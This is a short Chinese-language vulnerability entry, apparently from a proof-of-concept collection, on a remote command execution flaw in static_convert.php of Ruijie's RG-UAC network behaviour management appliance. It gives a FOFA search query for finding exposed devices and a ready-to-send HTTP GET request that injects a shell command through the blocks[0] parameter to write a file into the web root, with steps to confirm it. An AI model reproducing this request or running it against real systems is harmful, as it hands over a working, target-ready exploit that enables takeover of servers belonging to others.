## 锐捷上网行为管理系统static_convert.php存在远程命令执行漏洞

锐捷统一上网行为管理与审计RG-UAC系列是星网锐捷网络有限公司自主研发的上网行为管理与审计产品，static_convert.php存在远程命令执行漏洞，导致服务器被控。

## fofa

```
title="RG-UAC登录页面"
```

## poc

```
GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||%20%20echo%20'mht666'%20>>%20/var/www/html/mht.txt%0A HTTP/1.1
Host:
Accept: application/json, text/javascript, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

写入`mht.txt`，文件访问`http://127.0.0.1/mht.txt`

![image-20240621192248862](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406211922899.png)